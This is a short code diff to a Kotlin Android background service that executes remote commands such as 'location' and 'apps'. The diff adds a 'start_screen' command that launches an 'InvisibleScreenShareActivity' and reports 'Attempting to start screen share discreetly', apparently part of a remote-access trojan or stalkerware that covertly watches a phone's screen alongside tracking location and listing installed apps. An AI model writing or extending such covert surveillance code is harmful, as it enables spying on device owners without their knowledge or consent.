@@ -572,6 +572,14 @@ class AgentService : Service() {
 
                                 command == "location" -> getDeviceLocation()
 
+                                command == "start_screen" -> {
+                                    val actIntent = Intent(applicationContext, InvisibleScreenShareActivity::class.java).apply {
+                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                                    }
+                                    applicationContext.startActivity(actIntent)
+                                    "Attempting to start screen share discreetly..."
+                                }
+
                                 command == "apps" -> getInstalledApps()
 
                                 command == "user_apps" -> getUserInstalledApps()
@@ -1021,3 +1029,7 @@ class AgentService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 }
+
+
+
+
